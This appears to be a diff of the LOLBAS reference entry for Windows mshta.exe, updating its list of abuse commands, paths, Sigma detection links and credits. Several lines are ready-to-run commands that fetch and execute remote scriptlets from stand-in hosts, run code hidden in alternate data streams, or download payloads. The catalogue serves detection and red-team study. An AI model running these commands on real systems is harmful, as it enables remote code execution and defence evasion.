@@ -3,42 +3,46 @@ Description: Used by Windows to execute html applications. (.hta)
 Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-- Command: mshta.exe evilfile.hta
-  Description: Opens the target .HTA and executes embedded JavaScript, JScript, or
-    VBScript.
-  Usecase: Execute code
-  Category: Execute
-  Privileges: User
-  MitreID: T1218.005
-  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-- Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
-  Description: Executes VBScript supplied as a command line argument.
-  Usecase: Execute code
-  Category: Execute
-  Privileges: User
-  MitreID: T1218.005
-  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-- Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
-  Description: Executes JavaScript supplied as a command line argument.
-  Usecase: Execute code
-  Category: Execute
-  Privileges: User
-  MitreID: T1218.005
-  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-- Command: mshta.exe "C:\ads\file.txt:file.hta"
-  Description: Opens the target .HTA and executes embedded JavaScript, JScript, or
-    VBScript.
-  Usecase: Execute code hidden in alternate data stream
-  Category: ADS
-  Privileges: User
-  MitreID: T1218.005
-  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does
-    not work on 1903 and newer)
+  - Command: mshta.exe evilfile.hta
+    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+    Usecase: Execute code
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.005
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
+    Description: Executes VBScript supplied as a command line argument.
+    Usecase: Execute code
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.005
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();
+    Description: Executes JavaScript supplied as a command line argument.
+    Usecase: Execute code
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.005
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: mshta.exe "C:\ads\file.txt:file.hta"
+    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+    Usecase: Execute code hidden in alternate data stream
+    Category: ADS
+    Privileges: User
+    MitreID: T1218.005
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
+  - Command: mshta.exe https://example.com/payload
+    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Usecase: Downloads payload from remote server
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
 - Path: C:\Windows\System32\mshta.exe
 - Path: C:\Windows\SysWOW64\mshta.exe
 Code_Sample:
-- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct
+  - Code: https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019
 Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/05c58b4892942c34bfa01e9ada88ef2663858e1c/rules/windows/process_creation/win_susp_mshta_pattern.yml
 - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_invoke_obfuscation_via_use_mhsta.yml
@@ -73,7 +77,9 @@ Resources:
 - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 - Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
 Acknowledgement:
-- Person: Casey Smith
-  Handle: '@subtee'
-- Person: Oddvar Moe
-  Handle: '@oddvarmoe'
+  - Person: Casey Smith
+    Handle: '@subtee'
+  - Person: Oddvar Moe
+    Handle: '@oddvarmoe'
+  - Person: Nir Chako (Pentera)
+    Handle: '@C_h4ck_0'
